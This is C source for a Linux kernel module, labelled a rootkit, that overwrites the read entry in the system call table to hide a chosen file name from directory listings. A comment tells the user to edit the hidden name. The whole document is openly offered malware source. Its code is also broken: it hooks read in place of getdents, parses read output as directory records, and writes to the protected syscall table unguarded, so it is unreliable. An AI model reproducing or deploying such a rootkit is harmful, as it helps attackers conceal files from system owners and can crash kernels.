#change 26 line (the my_hidden_file of the file (script) that you want to hide)

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");

// Define the original read system call
asmlinkage long (*original_read)(unsigned int fd, char __user *buf, size_t count);

// Define the modified read system call
asmlinkage long hooked_read(unsigned int fd, char __user *buf, size_t count) {
    struct linux_dirent *dirp;
    int nread, bpos;
    char *from, *to;
    long ret;

    // Call the original read system call to get the directory contents
    ret = (*original_read)(fd, buf, count);

    // Loop through the directory entries
    for (bpos = 0; bpos < ret;) {
        dirp = (struct linux_dirent *)(buf + bpos);
        if (strcmp(dirp->d_name, "my_hidden_file") == 0) {
            // Hide the file by shifting the remaining entries left
            from = (char *)(buf + bpos + dirp->d_reclen);
            to = (char *)(buf + bpos);
            nread = ret - (bpos + dirp->d_reclen);
            memmove(to, from, nread);
            ret -= dirp->d_reclen;
        } else {
            // Move to the next entry
            bpos += dirp->d_reclen;
        }
    }

    return ret;
}

static int __init rootkit_init(void) {
    // Find the system call table address
    unsigned long *syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // Save the address of the original read system call
    original_read = (void *)(syscall_table[__NR_read]);

    // Replace the read system call with our own
    syscall_table[__NR_read] = (unsigned long)hooked_read;

    printk(KERN_INFO "Rootkit loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    // Restore the original read system call
    unsigned long *syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    syscall_table[__NR_read] = (unsigned long)original_read;

    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
